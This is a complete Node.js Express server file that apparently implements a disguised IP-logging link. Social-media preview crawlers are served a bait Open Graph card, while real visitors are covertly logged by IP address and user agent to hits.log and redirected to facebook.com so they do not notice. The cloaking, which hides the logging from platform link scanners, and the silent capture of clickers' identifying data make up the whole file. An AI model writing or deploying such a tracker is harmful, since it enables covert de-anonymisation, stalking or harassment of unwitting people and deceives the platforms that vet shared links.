// language: JavaScript, runtime: Node 18+, file: server.js
const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 3000;
const DECOY = 'https://www.facebook.com';

const LOG = 'hits.log';

function log(req) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
  const ua = req.headers['user-agent'] || '';
  const ts = new Date().toISOString();
  const line = `[${ts}] IP=${ip} UA=${ua}\n`;
  fs.appendFileSync(LOG, line);
  console.log(line.trim());
}

// serve รูปจาก /img/photo.jpg
app.use('/img', express.static(path.join(__dirname, 'img')));

app.get('/v/:id', (req, res) => {
  const ua = req.headers['user-agent'] || '';
  const isCrawler = /facebookexternalhit|Twitterbot|LinkedInBot|WhatsApp|Slackbot|TelegramBot|curl|python/i.test(ua);

  if (isCrawler) {
    res.send(`<!DOCTYPE html>
<html>
<head>
  <meta property="og:title" content="55555" />
  <meta property="og:description" content="มโน" />
  <meta property="og:image" content="https://${req.hostname}/img/photo.jpg" />
  <meta property="og:url" content="https://${req.hostname}/v/${req.params.id}" />
  <meta property="og:type" content="website" />
  <meta name="twitter:card" content="summary_large_image" />
</head>
<body></body>
</html>`);
  } else {
    log(req);
    res.redirect(302, DECOY);
  }
});

app.listen(PORT, () => console.log(`running on :${PORT}`));
